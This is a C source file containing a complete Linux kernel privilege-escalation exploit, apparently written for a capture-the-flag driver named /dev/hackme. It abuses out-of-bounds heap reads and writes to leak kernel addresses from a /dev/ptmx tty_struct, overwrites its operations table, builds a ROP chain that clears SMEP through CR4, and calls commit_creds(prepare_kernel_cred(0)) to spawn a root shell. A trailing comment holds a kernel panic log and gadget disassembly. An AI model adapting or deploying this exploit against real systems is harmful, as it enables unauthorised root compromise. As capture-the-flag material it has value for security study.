#include <stdio.h>
#include <pthread.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

#define ALLOC 0x30000
#define DEL 0x30001
#define READ 0x30003
#define WRITE 0x30002

struct arg
{
	size_t idx;
	void *addr;
	long long len;
	long long offset;
};

void alloc(int fd,int idx,char *user,long long len){
	struct arg cmd;
	cmd.idx = idx;
	cmd.len = len;
	cmd.addr = user;
	ioctl(fd,ALLOC,&cmd);
}

void delete(int fd,int idx){
	struct arg cmd;
	cmd.idx = idx;
	ioctl(fd,DEL,&cmd);
}

void read_from_kernel(int fd,int idx,char *user,long long len,long long offset){
	struct arg cmd;
	cmd.idx = idx;
	cmd.len = len;
	cmd.addr = user;
	cmd.offset = offset;
	ioctl(fd,READ,&cmd);	
}
void write_to_kernel(int fd,int idx,char *user,long long len,long long offset){
	struct arg cmd;
	cmd.idx = idx;
	cmd.len = len;
	cmd.addr = user;
	cmd.offset = offset;
	ioctl(fd,WRITE,&cmd);	
}

void print_hex( char *buf,int size){
	int i;
	puts("======================================");
	printf("data :\n");
	for (i=0 ; i<(size/8);i++){
		if (i%2 == 0){
			printf("%d",i/2);
		}
		printf(" %16llx",*(size_t * )(buf + i*8));
		if (i%2 == 1){
			printf("\n");
		}		
	}
	puts("======================================");
}

size_t user_cs, user_ss,user_rflags, user_sp ,user_gs,user_es,user_fs,user_ds;
void save_status(){
    __asm__("mov %%cs, %0\n"
            "mov %%ss,%1\n"
            "mov %%rsp,%2\n"
            "pushfq\n"
            "pop %3\n"
            "mov %%gs,%4\n"
            "mov %%es,%5\n"
            "mov %%fs,%6\n"
            "mov %%ds,%7\n"
            ::"m"(user_cs),"m"(user_ss),"m"(user_sp),"m"(user_rflags),
            "m"(user_gs),"m"(user_es),"m"(user_fs),"m"(user_ds)
            );
    puts("[*]status has been saved.");
}
void sh(){
    system("sh");
    exit(0);
}
int (*commit_creds)(unsigned long cred);
unsigned long (*prepare_kernel_cred)(unsigned long cred);

void sudo(){
    commit_creds(prepare_kernel_cred(0));
    asm(
    "push %0\n"
    "push %1\n"
    "push %2\n"
    "push %3\n"
    "push %4\n"
    "push $0\n"
    "swapgs\n"
    "pop %%rbp\n"
    "iretq\n"
    ::"m"(user_ss),"m"(user_sp),"m"(user_rflags),"m"(user_cs),"a"(&sh)
    );
}

int main(){
	save_status();
	int fd = open("/dev/hackme", 0);
	char *mem = malloc(0x2000);
	memset(mem,'A',0x2000);
	size_t heap_addr , kernel_addr,mod_addr;
	if (fd < 0){
		printf("[-] bad open /dev/hackme\n");
		exit(-1);
	}
	alloc(fd,0,mem,0x400);
	alloc(fd,1,mem,0x400);
	alloc(fd,2,mem,0x400);
	alloc(fd,3,mem,0x400);
	alloc(fd,4,mem,0x400);	
	alloc(fd,5,mem,0x400);	
	printf("[+] create finished\n");
	delete(fd,2);
	delete(fd,4);

	read_from_kernel(fd,5,mem,0x400,-0x400);
	heap_addr = *((size_t *)mem);
	printf("[+] heap addr : %16llx\n",heap_addr );

	printf("[+] delete finished\n");
	int ptmx_fd = open("/dev/ptmx",0);
	if (ptmx_fd < 0){
		printf("[-] bad open /dev/hackme\n");
		exit(-1);
	}
	printf("[+] ptmx fd : %d\n",ptmx_fd);

	read_from_kernel(fd,5,mem,0x400,-0x400);
	//print_hex(mem,0x400);
	if(*(size_t *)mem != 0x0000000100005401){

		printf("[-] bad found ptmx");
		exit(-1);
	}

	kernel_addr = *((size_t  *)(mem+0x18)) ;
	if ((kernel_addr & 0xfff)!=0xd80){
		printf("[-] bad ptmx fops");
		exit(-1);		
	}
	kernel_addr -= 0x625d80;	
	printf("[+] kernel addr : %16llx\n",kernel_addr );	
    prepare_kernel_cred = 0x4d3d0 + kernel_addr;
    commit_creds = 0x4d220+kernel_addr;	
	*((size_t  *)(mem+0x18)) = heap_addr-0x400+0x20;
	*((size_t  *)(mem+0x38)) = heap_addr-0x400+0x220;
	write_to_kernel(fd,5,mem,0x400,-0x400);
	printf("[+] finished overwrite fops\n");	
	//memset(mem,'C',0x400);
	for(int j;j<0x10;j++){
		*((size_t  *)(mem+0x20+8*j)) = kernel_addr + 0x5dbef;
	}
	*((size_t  *)(mem+0x220)) = kernel_addr + 0x01b5a1; //pop rax ; ret
	*((size_t  *)(mem+0x220+8)) = 0x6f0;
	*((size_t  *)(mem+0x220+16)) = kernel_addr + 0x0252b; //mov cr4, rax; push rcx; popfq; pop rbp; ret;
	*((size_t  *)(mem+0x220+24)) = 0xdeadbeef;
	*((size_t  *)(mem+0x220+32)) = &sudo;

	*((size_t  *)(mem+0x220+0xc8)) = kernel_addr +0x200f66;
	write_to_kernel(fd,5,mem,0x400,0);
	getchar();
	ioctl(ptmx_fd,0xdeadbeef,0xdeadbabe);
}

/* kernel panic

[    9.173878] general protection fault: 0000 [#1] NOPTI
[    9.174524] CPU: 0 PID: 32 Comm: exp Tainted: G           O      4.20.13 #10
[    9.174723] RIP: 0010:0x4343434343434343
[    9.174944] Code: Bad RIP value.
[    9.175065] RSP: 0018:ffffc90000097d78 EFLAGS: 00000202
[    9.175183] RAX: 4343434343434343 RBX: ffff88800e962000 RCX: 00000000deadbeef
[    9.175346] RDX: 00000000deadbabe RSI: 00000000deadbeef RDI: ffff88800e962000
[    9.175500] RBP: ffffc90000097e10 R08: 00000000deadbabe R09: 00000000dead6ae1
[    9.175621] R10: 0000000000000000 R11: 0000000000000000 R12: 00000000deadbeef
[    9.175738] R13: 00000000deadbabe R14: ffff88800017bc00 R15: ffff88800e962800
[    9.175883] FS:  000000000198c880(0000) GS:ffffffff81836000(0000) knlGS:0000000000000000
[    9.176194] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[    9.176293] CR2: 00000000019918a8 CR3: 000000000e964000 CR4: 00000000003006b0

   0xffffffff8105dbef:	mov    rax,QWORD PTR [rbx+0x38]
   0xffffffff8105dbf3:	lea    rdi,[rbx+0x20]
   0xffffffff8105dbf7:	mov    rdx,QWORD PTR [rax+0xc8]
   0xffffffff8105dbfe:	test   rdx,rdx
   0xffffffff8105dc01:	je     0xffffffff8105d805
   0xffffffff8105dc07:	call   rdx


   0xffffffff81200f66:	mov    rsp,rax
   0xffffffff81200f69:	jmp    0xffffffff81200ee7
   0xffffffff81200ee7:	pop    r12
   0xffffffff81200ee9:	mov    rdi,rsp
   0xffffffff81200eec:	call   0xffffffff81016190
   0xffffffff81200ef1:	mov    rsp,rax
   0xffffffff81200ef4:	lea    rbp,[rsp+0x1]
   0xffffffff81200ef9:	push   r12
   0xffffffff81200efb:	ret  
*/